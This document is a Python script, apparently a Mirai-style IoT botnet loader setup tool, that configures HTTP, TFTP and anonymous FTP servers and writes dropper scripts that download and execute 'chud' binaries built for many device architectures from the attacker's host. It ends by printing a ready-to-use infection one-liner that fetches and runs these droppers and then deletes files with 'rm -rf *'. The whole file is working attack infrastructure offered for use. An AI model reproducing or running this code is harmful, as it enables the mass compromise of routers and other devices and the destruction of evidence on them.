import subprocess, sys
try:
    from urllib.request import urlopen
except ImportError:
    from urllib import urlopen

ip = urlopen('http://api.ipify.org').read().decode().strip()
exec_bin = "chud"
bin_prefix = "chud."
bin_directory = "bins"
archs = ["x86", "mips", "mpsl", "arm", "arm5", "arm6", "arm7", "ppc", "m68k", "sh4", "x86_64", "arc"]

def run(cmd):
    subprocess.call(cmd, shell=True)

print("Setting up HTTP TFTP and FTP for your payload")
print("")

run("apt install apache2 -y >/dev/null 2>&1")
run("systemctl start apache2 >/dev/null 2>&1")
run("apt install xinetd tftpd-hpa -y >/dev/null 2>&1")
run("apt install vsftpd -y >/dev/null 2>&1")
run("systemctl start vsftpd >/dev/null 2>&1")
run('''echo "service tftp
{
	socket_type             = dgram
	protocol                = udp
	wait                    = yes
    user                    = root
    server                  = /usr/sbin/in.tftpd
    server_args             = -s -c /var/lib/tftpboot
    disable                 = no
    per_source              = 11
    cps                     = 100 2
    flags                   = IPv4
}
" > /etc/xinetd.d/tftp''')
run("systemctl start xinetd >/dev/null 2>&1")
run('''echo "listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address='''+ ip +'''
listen_port=21" > /etc/vsftpd.conf''')
run("systemctl restart vsftpd >/dev/null 2>&1")
run("systemctl restart xinetd >/dev/null 2>&1")
print("Creating .sh Bins")
print("")
run('echo "#!/bin/bash" > /var/lib/tftpboot/chud.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/chud.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/chud.sh')
run('echo "#!/bin/bash" > /var/lib/tftpboot/chud2.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/chud2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/chud2.sh')
run('echo "#!/bin/bash" > /var/www/html/chud.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/chud2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/chud2.sh')
run('echo "#!/bin/bash" > /var/ftp/chud1.sh')
run('echo "ulimit -n 1024" >> /var/ftp/chud1.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/ftp/chud1.sh')
for i in archs:
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+'" >> /var/www/html/chud.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' '+bin_prefix+i+' '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+'" >> /var/ftp/chud1.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+'" >> /var/lib/tftpboot/chud.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r '+bin_prefix+i+' -g ' + ip + ';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+'" >> /var/lib/tftpboot/chud2.sh')
run("systemctl restart xinetd >/dev/null 2>&1")
run("systemctl restart apache2 >/dev/null 2>&1")
run('echo "ulimit -n 99999" >> ~/.bashrc')
print("\x1b[0;32mPayload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/chud.sh; curl -O http://" + ip + "/chud.sh; chmod 777 chud.sh; sh chud.sh; tftp " + ip + " -c get chud.sh; chmod 777 chud.sh; sh chud.sh; tftp -r chud2.sh -g " + ip + "; chmod 777 chud2.sh; sh chud2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " chud1.sh chud1.sh; sh chud1.sh; rm -rf chud.sh chud.sh chud2.sh chud1.sh; rm -rf *\x1b[0m")
print("")
try:
    input("press any key to exit....")
except NameError:
    raw_input("press any key to exit....")
